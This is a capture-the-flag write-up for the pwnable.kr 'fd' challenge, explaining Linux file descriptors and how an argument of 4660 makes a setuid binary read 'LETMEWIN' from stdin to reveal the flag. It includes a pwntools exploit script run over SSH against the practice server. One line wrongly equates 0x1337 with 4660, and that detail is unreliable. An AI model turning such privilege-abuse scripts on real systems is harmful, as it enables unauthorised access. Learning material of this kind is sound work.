# fd Writeup

## Challenge infos

```text
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
$ sshpass -p guest ssh fd@pwnable.kr -p2222
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|


- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Tue Apr  9 04:32:14 2019 from 203.249.127.35
fd@ubuntu:~$ ls -la
total 40
drwxr-x---  5 root   fd   4096 Oct 26  2016 .
drwxr-xr-x 93 root   root 4096 Oct 10 22:56 ..
d---------  2 root   root 4096 Jun 12  2014 .bash_history
-r-sr-x---  1 fd_pwn fd   7322 Jun 11  2014 fd
-rw-r--r--  1 root   root  418 Jun 11  2014 fd.c
-r--r-----  1 fd_pwn root   50 Jun 11  2014 flag
-rw-------  1 root   root  128 Oct 26  2016 .gdb_history
dr-xr-xr-x  2 root   root 4096 Dec 19  2016 .irssi
drwxr-xr-x  2 root   root 4096 Oct 23  2016 .pwntools-cache
fd@ubuntu:~$ id                                                                                                                                     
uid=1004(fd) gid=1004(fd) groups=1004(fd)                                                                                                           
fd@ubuntu:~$ file fd
fd: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c5ecc1690866b3bb085d59e87aad26a1e386aaeb, not stripped
fd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

fd@ubuntu:~$
```
## Exploitation objective
* The ssh user is ```fd```, group ```fd```
* The ```flag``` file is readable only by the user ```fd_pwn``` or the group ```root```
* The ```fd``` binary is a 32bit ELF executable by the ```fd_pwn``` user or members of the ```fd``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```fd``` executable we can gain read access to the ```flag``` file via suid user ```fd_pwn```.

The ```fd``` executable is certainly compiled from the ```fd.c``` source code, let's have a look.

## C code analysis
```c
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
```

* We need to call the program with a number as first argument : ```./fd [n]```


```c
        int fd = atoi( argv[1] ) - 0x1234;
```

* The ```[n]``` argument is used to define the ```fd``` variabl by substracting ```0x1234``` (hexadecimal number 4660) from it

```c
        len = read(fd, buf, 32);
```

* The ```fd``` variable is used as the file descriptor to read a string to the buffer ```buf```

```c
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
```

* If the content of the buffer ```buf``` is equal to ```"LETMEWIN\n"``` (```\n``` denotes newline character) the executable calls ```system()``` to output the content of ```flag``` with ```cat```, this is our target

## File descriptor understanding

The ```fd``` variable is a file descriptor, an unique value linking to an open stream for reading or writing

There is 3 defined files descriptors when the program is started and we can define new ones with a call to ```open()```

The 3 already open ones are :
* ```0``` : refers to ```stdin```, the standard input stream, read only
* ```1``` : refers to ```stdout```, the standard output stream, write only
* ```2``` : refers to ```stderr```, the standard error stream, write only

## Exploitation

* There is no call to ```open()``` in the program but since we can manipulate ```fd``` through ```[n]``` we can set it to ```0``` in order to read from ```stdin```

* If we set ```[n]``` to ```0x1337``` = ```4660``` we can call the program with ```./fd 4660```, forcing it to read the buffer frmo ```stdin```

* We the input ```LETMEWIN``` and press ```Enter``` to send a newline character ```\n```

* The check is then passed and the ```flag``` is output

* ```PWN```

## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
argv_1 = 0x1234
```
* Set the ```argv_1``` variable to ```0x1234``` (Python can understand hexadecimal values by starting a number with ```0x``` and converts them to decimal)
```python
# io = process(['./fd', str(argv_1)])

server = ssh('fd', 'pwnable.kr', 2222, 'guest')
io = server.process(['./fd', str(argv_1)])
```
* During testing the ```io``` is set to the local ```./fd``` executable downloaded by the setup script
* After the exploit is working we can use it on the server by ssh-ing to it before setting ```io``` to the remote ```.\fd``` executable
* In both cases, pass the ```argv_1``` argument
```python
io.sendline('LETMEWIN')

result = io.recvall()

io.close()
server.close()

print(result)
```
* Send the ```LETMEWIN``` line with a newline character (with ```sendline()```)
* Print the ```result``` which is the ```flag```
* ```PWN```
